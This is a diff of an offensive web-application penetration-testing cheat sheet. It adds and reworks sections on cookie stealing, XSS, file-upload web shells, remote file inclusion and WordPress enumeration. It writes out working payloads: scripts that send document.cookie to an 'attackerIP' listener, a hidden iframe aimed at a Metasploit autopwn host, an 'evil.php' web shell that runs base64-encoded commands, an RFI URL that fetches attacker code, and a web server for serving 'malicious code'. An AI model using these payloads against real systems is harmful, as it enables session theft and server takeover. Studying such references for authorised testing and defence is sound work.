@@ -1,13 +1,21 @@
 Web Apps
 
 
+# Firefox plugins
+
+Cookies Manager+
+Live HTTP Header (clone)
+Proxy Switcher
+User-Agent Switcher
+------------------------------------------------------------------------------------------------------
+
 # Request Methods
 
 GET  Passes all query material in the URL query string.
 POST Passes all requested data in the HTTP request body.
 ------------------------------------------------------------------------------------------------------
 
-# Common Response Status Codes
+# HTTP Status Codes
 
 1xx  Informational
 100  Continue
@@ -20,6 +28,7 @@ POST Passes all requested data in the HTTP request body.
 302  Found
 
 4xx  Client Error
+400  Bad Request
 401  Unauthorized
 403  Forbidden
 404  Not Found
@@ -29,10 +38,11 @@ POST Passes all requested data in the HTTP request body.
 500  Internal Server Error
 ------------------------------------------------------------------------------------------------------
 
-# Cookies
+# Simple web server to share malicious code
 
-Secure - only send over encrypted channel
-HttpOnly - prevents JavaScript from accessing the cookie
+Change directory to where your scripts and web shells are located.
+cd /root/scripts/
+python -m SimpleHTTPServer 80
 ------------------------------------------------------------------------------------------------------
 
 # Apache version, eTag, HTTP Basic Authentication Enabled
@@ -46,7 +56,7 @@ for i in `cat 80.txt` ; do curl -iskXHEAD http://$i/ > $i 2>&1 ; echo Scanned $i
 
 # Browser Redirection
 
-<iframe SRC="http://hackerip/report" height = "0" width ="0">
+<iframe SRC="http://attackerIP/report" height = "0" width ="0">
 hacker:  use Metasploit browser autopwn listening on hackerip
 ------------------------------------------------------------------------------------------------------
 
@@ -58,6 +68,9 @@ https://targetIP/level/x/exec/-/show
 
 # Cookie Security Issues - missing HttpOnly or Secure attribute
 
+HttpOnly - prevents JavaScript from accessing the cookie
+Secure - only send over an encrypted channel
+
 Firefox
 Cookies > View Cookie Information
 HttpOnly cookie tells the browser if a Java scripts tries to access the cookie, the browser should not return a value.
@@ -67,11 +80,11 @@ for i in `cat 80.txt` ; do curl -iskXHEAD http://$i/ > $i 2>&1 ; echo Scanned $i
 
 # Cookie Stealing
 
-<script>new Image().src="http://hackerip/woot.php?"+ document.cookie;</script>
+<script>new Image().src="http://attackerIP/test.php?"+ document.cookie;</script>
 hacker:  nc -lvp 80
 ------------------------------------------------------------------------------------------------------
 
-# File upload vuln 
+# File upload vuln
 
 Create a php file called evil.php 
 <?php
@@ -80,7 +93,7 @@ $decode=base64_decode($cmd);
 os.system($decode);
 ?>
 
-Once the malicious file is in place, pass base64 encoded commands to it, and get basic code execution on the web server, as the “apache” user.
+Once the malicious file is in place, pass base64 encoded commands to it, and get basic code execution on the web server, as the "apache" user.
 
 wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo id|base64)
 cat output
@@ -93,6 +106,11 @@ cat output
 
 When fuzzing headers, disable URL Encode.
 When you are inside of a POST parameter, always use URL encoding.
+------------------------------------------------------------------------------------------------------
+
+# Headers
+
+curl -i -X targetURL
 ------------------------------------------------------------------------------------------------------
 
 # Local file inclusion
@@ -110,9 +128,9 @@ http://target IP/aaaaa.php
 Firefox > Web Developer Toolbar > Information > View Response Headers
 ------------------------------------------------------------------------------------------------------
 
-# Remote file inclusion
+# Remote File Inclusion
 
-http://localhost/index.php?page=http://attackersHost/evil.txt
+http://target IP/index.php?page=http://attackerIP/evil.txt
 ------------------------------------------------------------------------------------------------------
 
 # TRACE / TRACK methods allowed
@@ -120,6 +138,29 @@ http://localhost/index.php?page=http://attackersHost/evil.txt
 telnet <target IP> 80
 OPTIONS / HTTP/1.0
 (hit enter 2x)
+
+Check for cross-site tracing (XST)
+curl -X TRACE <target IP>
+curl -X TRACE -H "Cookie: name=value" <target>
+------------------------------------------------------------------------------------------------------
+
+# URL Encoding
+
+%20       space
+%40   @   at
+%26   &   ampersand
+%28   (   open parenthesis
+%29   )   close parenthesis
+%3B   ;   semicolon
+%22   "   double quote
+%27   '   single quote
+%3C   <   less than
+%3E   >   greater than
+%2E   .   period
+%2F   /   forward slash
+
+Example: <script>alert(document.cookie);</script>
+Encoded: %3Cscript%3Ealert%28document%2Ecookie%29%3B%3C%2Fscript%3E
 ------------------------------------------------------------------------------------------------------
 
 # WebDAV extensions are enabled
@@ -132,15 +173,18 @@ use auxiliary/scanner/http/webdav_scanner
 for i in $(cat 80.txt); do cadaver -t $i; done
 ------------------------------------------------------------------------------------------------------
 
-# WordPress XSS vuln
+# WordPress
 
-wpscan.rb - -url www.target.com - -enumerate p
+wpscan -u www.target.com -e u vp vt -r
+
+cd /usr/share/wpscan/
+stop_user_enumeration_bypass.rb www.target.com --ids 1-1000
 ------------------------------------------------------------------------------------------------------
 
 # XML Injection
 
 Single quote         foo'
-Double quote         foo”
+Double quote         foo"
 Greater than         foo>
 Less than            foo<			
 Comment tag          foo<!--
@@ -149,12 +193,18 @@ Ampersand            &foo
 
 # XSS
 
-http://target.com/index.php?user=<script>alert(1)</script>
-http://target.com/index.php?user=<script>alert("Test XSS")alert</script>
+Stored - example: guestbook
+<script>alert("XSS");</script>
+<script>alert(document.cookie);</script>
+<iframe SRC="http://attackerIP" height="0" width="0"></iframe>
+<script>new Image().src="http://attakerIP/test.php?output="+document.cookie;</script>
 
-curl https://target.com/login.php?user=`perl –e 'print "a" x 500'`
+curl http://target.com/login.php?user=`perl –e 'print "a" x 500'`
+------------------------------------------------------------------------------------------------------
 
-<iframe height=”0″ width=”0″ src=<BeEF_hook></iframe>
+# External How-To
 
-<script>alert(document.cookie)</script>
-<script>var img = new Image(); img.src=“http://127.0.0.1:8000/?cookie=“+document.cookie;</script>
+http://bughunting.guide/a-gentle-introduction-to-cross-site-scripting-xss/
+http://bughunting.guide/discovering-xss-vulnerabilities-with-burp-intruder/
+https://nvisium.com/blog/2014/01/31/accurate-xss-detection-with-burpsuite/
+https://forum.bugcrowd.com/t/tutorial-injectx-to-find-xss/790
